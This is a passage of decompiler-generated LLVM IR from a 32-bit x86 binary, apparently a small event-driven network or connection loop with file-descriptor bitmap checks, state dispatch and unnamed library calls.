  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_8052dc8()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_8052e82(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp141, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_8053230()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_8052bc1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_80526b0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_805328e()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp142, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554e4.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_80526d0()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554e4.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_80526d0()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
